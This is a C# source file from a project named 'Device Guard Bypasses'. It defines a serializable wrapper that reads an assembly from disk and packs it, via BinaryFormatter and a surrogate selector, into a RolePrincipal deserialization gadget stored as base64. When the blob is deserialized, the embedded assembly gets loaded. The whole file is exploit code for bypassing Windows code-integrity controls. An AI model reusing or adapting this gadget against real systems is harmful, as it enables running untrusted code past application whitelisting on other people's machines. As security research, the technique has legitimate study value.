//  This file is part of Device Guard Bypasses
//
//  Device Guard Bypasses is free software: you can redistribute it 
//  and/or modify it under the terms of the GNU General Public License
//  as published by the Free Software Foundation, either version 3 of 
//  the License, or (at your option) any later version.
//
//  Foobar is distributed in the hope that it will be useful,
//  but WITHOUT ANY WARRANTY; without even the implied warranty of
//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
//  GNU General Public License for more details.
//
//  You should have received a copy of the GNU General Public License
//  along with Foobar.  If not, see<http://www.gnu.org/licenses/>.

using System;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Web.Security;

namespace CommonLib
{
    [Serializable]
    public class WrappedAssemblyObject : ISerializable
    {
        public byte[] _assembly;

        public WrappedAssemblyObject(string filename)
        {
            _assembly = File.ReadAllBytes(filename);
        }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            BinaryFormatter fmt = new BinaryFormatter();
            MemoryStream stm = new MemoryStream();
            fmt.SurrogateSelector = new ObjectSurrogateSelector();
            fmt.Serialize(stm, Serializer.CreateAssemblyLoader(_assembly));
            info.SetType(typeof(RolePrincipal));
            info.AddValue("System.Security.ClaimsPrincipal.Identities", Convert.ToBase64String(stm.ToArray()));
        }
    }

}
